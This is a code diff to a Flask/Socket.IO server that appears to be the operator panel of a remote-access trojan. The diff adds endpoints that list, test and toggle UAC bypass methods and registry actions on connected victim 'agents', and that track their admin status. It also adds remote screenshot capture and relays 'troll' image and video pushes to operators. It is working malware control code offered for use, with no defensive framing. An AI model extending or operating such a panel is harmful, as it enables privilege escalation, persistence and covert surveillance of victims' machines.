@@ -37,6 +37,21 @@ import pyotp
 import qrcode
 import requests
 import json
+import re
+try:
+    import client as agent_client
+except Exception:
+    agent_client = None
+AGENT_OVERRIDES = {
+    'bypasses': {},
+    'registry': {},
+    'admin': {},
+    'flags': {
+        'bypasses': {},
+        'registry': {},
+    },
+    'admin': {}
+}
 
 def verify_totp_code(secret: str, otp: str, window: int = 2) -> bool:
     try:
@@ -2906,6 +2921,358 @@ def api_totp_status():
     created = cfg.get('totpCreatedAt')
     return jsonify({'enabled': enabled, 'enrolled': enrolled, 'verified_once': verified_once, 'failed_attempts': failed, 'created_at': created, 'issuer': issuer})
 
+def _parse_dict_from_client(var_name: str):
+    try:
+        if agent_client and hasattr(agent_client, var_name):
+            d = getattr(agent_client, var_name) or {}
+            return [{'key': k, 'enabled': bool(v)} for k, v in d.items()]
+        path = os.path.join(os.getcwd(), 'client.py')
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        m = re.search(rf"{var_name}\s*=\s*\{{(.*?)\}}\s*", content, re.S)
+        if not m:
+            return []
+        block = m.group(1)
+        items = re.findall(r"'([^']+)'\s*:\s*(True|False)", block)
+        return [{'key': k, 'enabled': v == 'True'} for k, v in items]
+    except Exception:
+        return []
+
+def _parse_bypass_sequence():
+    try:
+        path = os.path.join(os.getcwd(), 'client.py')
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        m = re.search(r"def\s+get_bypass_methods_sequence\(\):\s*return\s*\[\s*(.*?)\s*\]", content, re.S)
+        if not m:
+            return []
+        block = m.group(1)
+        entries = re.findall(r"\{\s*'id':\s*(\d+),\s*'name':\s*'([^']+)'\s*\}", block)
+        return [{'id': int(i), 'name': n} for i, n in entries]
+    except Exception:
+        return []
+
+@app.route('/api/system/bypasses', methods=['GET'])
+def api_system_bypasses():
+    methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
+    sequence = _parse_bypass_sequence()
+    g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False)) if agent_client else False
+    return jsonify({'methods': methods, 'sequence': sequence, 'global_enabled': g_enabled})
+
+@app.route('/api/system/registry', methods=['GET'])
+def api_system_registry():
+    actions = _parse_dict_from_client('REGISTRY_ACTIONS')
+    g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False)) if agent_client else False
+    return jsonify({'actions': actions, 'global_enabled': g_enabled})
+
+@app.route('/api/system/bypasses/test', methods=['POST'])
+def api_system_bypasses_test():
+    try:
+        data = request.get_json(silent=True) or {}
+        key = str(data.get('key') or '')
+        if not key:
+            return jsonify({'success': False, 'error': 'Missing key'}), 400
+        if agent_client and hasattr(agent_client, 'debug_bypass_method'):
+            res = agent_client.debug_bypass_method(key)
+            return jsonify({'success': True, 'result': res})
+        # Fallback: simulate based on parsed config
+        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
+        enabled = any(m['key'] == key and m['enabled'] for m in methods)
+        return jsonify({'success': True, 'result': {'method': key, 'enabled': enabled, 'executed': enabled}})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/registry/test', methods=['POST'])
+def api_system_registry_test():
+    try:
+        data = request.get_json(silent=True) or {}
+        key = str(data.get('key') or '')
+        agent_id = data.get('agent_id')
+        if not key:
+            return jsonify({'success': False, 'error': 'Missing key'}), 400
+        if agent_id:
+            need_admin = not bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
+            enabled = bool(AGENT_OVERRIDES['registry'].get(agent_id, {}).get(key, False))
+            g_enabled = bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False))
+            executed = enabled and g_enabled and not need_admin
+            return jsonify({'success': True, 'result': {'action': key, 'enabled': enabled, 'executed': executed, 'need_admin': need_admin}})
+        if agent_client and hasattr(agent_client, 'debug_registry_action'):
+            res = agent_client.debug_registry_action(key)
+            return jsonify({'success': True, 'result': res})
+        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
+        enabled = any(a['key'] == key and a['enabled'] for a in actions)
+        return jsonify({'success': True, 'result': {'action': key, 'enabled': enabled, 'executed': enabled}})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/registry/presence', methods=['POST'])
+def api_system_registry_presence():
+    try:
+        data = request.get_json(silent=True) or {}
+        key = str(data.get('key') or '')
+        agent_id = data.get('agent_id')
+        
+        if not key:
+            return jsonify({'success': False, 'error': 'Missing key'}), 400
+            
+        if agent_id:
+             # For remote agents, we currently don't have a real-time registry check mechanism implemented here
+             return jsonify({'success': True, 'result': {'present': False, 'message': 'Remote check not supported', 'path': 'Remote Agent'}})
+
+        if agent_client and hasattr(agent_client, 'check_registry_presence'):
+            res = agent_client.check_registry_presence(key)
+            return jsonify({'success': True, 'result': res})
+            
+        return jsonify({'success': False, 'error': 'Client capability not available'}), 503
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/bypasses/toggle', methods=['POST'])
+def api_system_bypasses_toggle():
+    try:
+        data = request.get_json(silent=True) or {}
+        key = data.get('key')
+        enabled = data.get('enabled')
+        global_enabled = data.get('global_enabled')
+        agent_id = data.get('agent_id')
+        
+        # Log the request for debugging
+        logger.info(f"Bypass toggle request - agent_id: {agent_id}, key: {key}, enabled: {enabled}, global_enabled: {global_enabled}")
+        
+        # Validate input
+        if not data:
+            logger.warning("Empty request data for bypass toggle")
+            return jsonify({'success': False, 'error': 'Missing request data'}), 400
+            
+        # For global operations, key and enabled can be None, but we need at least one of: key, enabled, or global_enabled
+        if key is None and enabled is None and global_enabled is None:
+            logger.warning("Missing parameters for bypass toggle - need at least key, enabled, or global_enabled")
+            return jsonify({'success': False, 'error': 'Missing required parameters'}), 400
+            
+        if key is not None and not isinstance(key, str):
+            logger.warning(f"Invalid key type for bypass toggle: {type(key)}")
+            return jsonify({'success': False, 'error': 'Invalid key format'}), 400
+            
+        if enabled is not None and not isinstance(enabled, bool):
+            logger.warning(f"Invalid enabled type for bypass toggle: {type(enabled)}")
+            return jsonify({'success': False, 'error': 'Invalid enabled format'}), 400
+            
+        if agent_id and not isinstance(agent_id, str):
+            logger.warning(f"Invalid agent_id type for bypass toggle: {type(agent_id)}")
+            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
+            
+        if global_enabled is not None and not isinstance(global_enabled, bool):
+            logger.warning(f"Invalid global_enabled type for bypass toggle: {type(global_enabled)}")
+            return jsonify({'success': False, 'error': 'Invalid global_enabled format'}), 400
+        
+        # Apply changes to agent client if available
+        if agent_client:
+            if isinstance(global_enabled, bool):
+                try:
+                    agent_client.BYPASSES_ENABLED = global_enabled
+                    agent_client.DISABLE_UAC_BYPASS = not global_enabled
+                    logger.info(f"Updated global bypasses to {global_enabled} in agent client")
+                except Exception as e:
+                    logger.error(f"Failed to update global bypasses in agent client: {e}")
+                    
+            if key:
+                try:
+                    agent_client.UAC_BYPASS_METHODS_ENABLED[key] = enabled
+                    logger.info(f"Updated bypass {key} to {enabled} in agent client")
+                except Exception as e:
+                    logger.error(f"Failed to update bypass {key} in agent client: {e}")
+                    
+        # Apply changes to agent overrides
+        if agent_id:
+            if isinstance(global_enabled, bool):
+                AGENT_OVERRIDES['flags']['bypasses'][agent_id] = global_enabled
+                logger.info(f"Updated global bypasses flag for agent {agent_id} to {global_enabled}")
+            if key:
+                AGENT_OVERRIDES['bypasses'].setdefault(agent_id, {})[key] = enabled
+                logger.info(f"Updated bypass {key} for agent {agent_id} to {enabled}")
+                
+        # Get current state
+        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
+        g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False))
+        
+        if agent_id:
+            g_enabled = bool(AGENT_OVERRIDES['flags']['bypasses'].get(agent_id, False))
+            merged = {m['key']: m['enabled'] for m in methods}
+            merged.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
+            methods = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
+            logger.info(f"Returning merged bypass state for agent {agent_id}: {len(methods)} methods, global_enabled: {g_enabled}")
+        else:
+            logger.info(f"Returning global bypass state: {len(methods)} methods, global_enabled: {g_enabled}")
+            
+        return jsonify({'success': True, 'methods': methods, 'global_enabled': g_enabled})
+        
+    except Exception as e:
+        logger.error(f"Error in api_system_bypasses_toggle: {str(e)}", exc_info=True)
+        return jsonify({'success': False, 'error': 'Internal server error'}), 500
+
+@app.route('/api/system/registry/toggle', methods=['POST'])
+def api_system_registry_toggle():
+    try:
+        data = request.get_json(silent=True) or {}
+        key = data.get('key')
+        enabled = data.get('enabled')
+        global_enabled = data.get('global_enabled')
+        agent_id = data.get('agent_id')
+        
+        # Log the request for debugging
+        logger.info(f"Registry toggle request - agent_id: {agent_id}, key: {key}, enabled: {enabled}, global_enabled: {global_enabled}")
+        
+        # Validate input
+        if not data:
+            logger.warning("Empty request data for registry toggle")
+            return jsonify({'success': False, 'error': 'Missing request data'}), 400
+            
+        # For global operations, key and enabled can be None, but we need at least one of: key, enabled, or global_enabled
+        if key is None and enabled is None and global_enabled is None:
+            logger.warning("Missing parameters for registry toggle - need at least key, enabled, or global_enabled")
+            return jsonify({'success': False, 'error': 'Missing required parameters'}), 400
+            
+        if key is not None and not isinstance(key, str):
+            logger.warning(f"Invalid key type for registry toggle: {type(key)}")
+            return jsonify({'success': False, 'error': 'Invalid key format'}), 400
+            
+        if enabled is not None and not isinstance(enabled, bool):
+            logger.warning(f"Invalid enabled type for registry toggle: {type(enabled)}")
+            return jsonify({'success': False, 'error': 'Invalid enabled format'}), 400
+            
+        if agent_id and not isinstance(agent_id, str):
+            logger.warning(f"Invalid agent_id type for registry toggle: {type(agent_id)}")
+            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
+            
+        if global_enabled is not None and not isinstance(global_enabled, bool):
+            logger.warning(f"Invalid global_enabled type for registry toggle: {type(global_enabled)}")
+            return jsonify({'success': False, 'error': 'Invalid global_enabled format'}), 400
+        
+        # Check admin privileges for registry operations
+        if agent_id:
+            need_admin = not bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
+            if need_admin:
+                logger.warning(f"Agent {agent_id} lacks admin privileges for registry operation")
+                return jsonify({'success': False, 'error': 'Admin privileges required', 'need_admin': True}), 403
+        
+        # Apply changes to agent client if available
+        if agent_client:
+            if isinstance(global_enabled, bool):
+                try:
+                    agent_client.REGISTRY_ENABLED = global_enabled
+                    logger.info(f"Updated global registry to {global_enabled} in agent client")
+                except Exception as e:
+                    logger.error(f"Failed to update global registry in agent client: {e}")
+                    
+            if key:
+                try:
+                    agent_client.REGISTRY_ACTIONS[key] = enabled
+                    logger.info(f"Updated registry action {key} to {enabled} in agent client")
+                except Exception as e:
+                    logger.error(f"Failed to update registry action {key} in agent client: {e}")
+                    
+        # Apply changes to agent overrides
+        if agent_id:
+            if isinstance(global_enabled, bool):
+                AGENT_OVERRIDES['flags']['registry'][agent_id] = global_enabled
+                logger.info(f"Updated global registry flag for agent {agent_id} to {global_enabled}")
+            if key:
+                AGENT_OVERRIDES['registry'].setdefault(agent_id, {})[key] = enabled
+                logger.info(f"Updated registry action {key} for agent {agent_id} to {enabled}")
+                
+        # Get current state
+        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
+        g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False))
+        
+        if agent_id:
+            g_enabled = bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False))
+            merged = {a['key']: a['enabled'] for a in actions}
+            merged.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
+            actions = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
+            logger.info(f"Returning merged registry state for agent {agent_id}: {len(actions)} actions, global_enabled: {g_enabled}")
+        else:
+            logger.info(f"Returning global registry state: {len(actions)} actions, global_enabled: {g_enabled}")
+            
+        return jsonify({'success': True, 'actions': actions, 'global_enabled': g_enabled})
+        
+    except Exception as e:
+        logger.error(f"Error in api_system_registry_toggle: {str(e)}", exc_info=True)
+        return jsonify({'success': False, 'error': 'Internal server error'}), 500
+
+@app.route('/api/system/agent/status', methods=['POST'])
+def api_system_agent_status():
+    try:
+        data = request.get_json(silent=True) or {}
+        agent_id = str(data.get('agent_id') or '')
+        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
+        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
+        if agent_id:
+            m = {m['key']: m['enabled'] for m in methods}
+            a = {a['key']: a['enabled'] for a in actions}
+            m.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
+            a.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
+            methods = [{'key': k, 'enabled': bool(v)} for k, v in m.items()]
+            actions = [{'key': k, 'enabled': bool(v)} for k, v in a.items()]
+        return jsonify({
+            'success': True,
+            'methods': methods,
+            'actions': actions,
+            'global_bypasses': bool(AGENT_OVERRIDES['flags']['bypasses'].get(agent_id, False)),
+            'global_registry': bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False)),
+            'admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False)),
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/agent/admin', methods=['POST'])
+def api_system_agent_admin():
+    try:
+        data = request.get_json(silent=True) or {}
+        agent_id = data.get('agent_id')
+        admin_enabled = data.get('admin_enabled')
+        
+        # Log the request for debugging
+        logger.info(f"Agent admin status update - agent_id: {agent_id}, admin_enabled: {admin_enabled}")
+        
+        # Validate input
+        if not agent_id:
+            logger.warning("Missing agent_id for admin status update")
+            return jsonify({'success': False, 'error': 'Missing agent_id'}), 400
+            
+        if not isinstance(agent_id, str):
+            logger.warning(f"Invalid agent_id type: {type(agent_id)}")
+            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
+            
+        if not isinstance(admin_enabled, bool):
+            logger.warning(f"Invalid admin_enabled type: {type(admin_enabled)}")
+            return jsonify({'success': False, 'error': 'Invalid admin_enabled format'}), 400
+        
+        # Update admin status
+        AGENT_OVERRIDES['admin'][agent_id] = admin_enabled
+        logger.info(f"Updated admin status for agent {agent_id} to {admin_enabled}")
+        
+        # Clear cache for agents endpoint to ensure fresh data
+        cache.delete('view//api/agents')
+        logger.info(f"Cleared agents cache after admin status update")
+        
+        # Emit real-time update to all connected clients
+        socketio.emit('agent_privilege_update', {
+            'agent_id': agent_id,
+            'is_admin': admin_enabled,
+            'timestamp': time.time()
+        })
+        logger.info(f"Emitted privilege update for agent {agent_id}")
+        
+        return jsonify({
+            'success': True,
+            'agent_id': agent_id,
+            'admin_enabled': admin_enabled
+        })
+        
+    except Exception as e:
+        logger.error(f"Error in api_system_agent_admin: {str(e)}", exc_info=True)
+        return jsonify({'success': False, 'error': 'Internal server error'}), 500
+
 @app.route('/api/auth/totp/enroll', methods=['POST'])
 def api_totp_enroll():
     if not request.is_json:
@@ -3142,7 +3509,8 @@ def get_agents():
                 'cpu': data.get('cpu_usage', 0),
                 'memory': data.get('memory_usage', 0),
                 'network': data.get('network_usage', 0)
-            }
+            },
+            'is_admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
         }
         agents.append(agent_info)
     
@@ -3174,7 +3542,8 @@ def get_agent_details(agent_id):
             'network': data.get('network_usage', 0)
         },
         'system_info': data.get('system_info', {}),
-        'uptime': data.get('uptime', 0)
+        'uptime': data.get('uptime', 0),
+        'is_admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
     }
     
     return jsonify(agent_info)
@@ -4538,8 +4907,12 @@ def handle_troll_show_image(data):
             sid = AGENTS_DATA.get(agent_id, {}).get('sid')
             if sid:
                 emit('troll_show_image', payload, room=sid)
+                # Also emit to operators room for frontend notifications
+                emit('troll_show_image', {**payload, 'agent_id': agent_id}, room='operators', broadcast=True)
         else:
             emit('troll_show_image', payload, room='agents', broadcast=True)
+            # Also emit to operators room for frontend notifications
+            emit('troll_show_image', payload, room='operators', broadcast=True)
         emit('activity_update', {
             'id': f'act_{int(time.time())}',
             'type': 'troll',
@@ -4566,8 +4939,12 @@ def handle_troll_show_video(data):
             sid = AGENTS_DATA.get(agent_id, {}).get('sid')
             if sid:
                 emit('troll_show_video', payload, room=sid)
+                # Also emit to operators room for frontend notifications
+                emit('troll_show_video', {**payload, 'agent_id': agent_id}, room='operators', broadcast=True)
         else:
             emit('troll_show_video', payload, room='agents', broadcast=True)
+            # Also emit to operators room for frontend notifications
+            emit('troll_show_video', payload, room='operators', broadcast=True)
         emit('activity_update', {
             'id': f'act_{int(time.time())}',
             'type': 'troll',
@@ -4622,6 +4999,7 @@ def handle_agent_connect(data):
         AGENTS_DATA[agent_id]["name"] = data.get('name', f'Agent-{agent_id}')
         AGENTS_DATA[agent_id]["platform"] = data.get('platform', 'Unknown')
         AGENTS_DATA[agent_id]["ip"] = data.get('ip', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
+        AGENTS_DATA[agent_id]["is_admin"] = data.get('is_admin', False)
         AGENTS_DATA[agent_id]["capabilities"] = data.get('capabilities', ['screen', 'files', 'commands'])
         AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
         AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
@@ -4815,6 +5193,18 @@ def handle_toggle_echo_cancellation(data):
     agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
     if agent_sid:
         emit('toggle_echo_cancellation', {'enabled': enabled}, room=agent_sid)
+@socketio.on('get_screenshot')
+@require_socket_auth
+def handle_get_screenshot(data):
+    agent_id = data.get('agent_id')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('get_screenshot', {'agent_id': agent_id}, room=agent_sid)
+    else:
+        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
+@socketio.on('screenshot_response')
+def handle_screenshot_response(data):
+    emit('screenshot_response', data, room='operators', broadcast=True)
 @socketio.on('agent_heartbeat')
 def handle_agent_heartbeat(data):
     agent_id = (data or {}).get('agent_id')
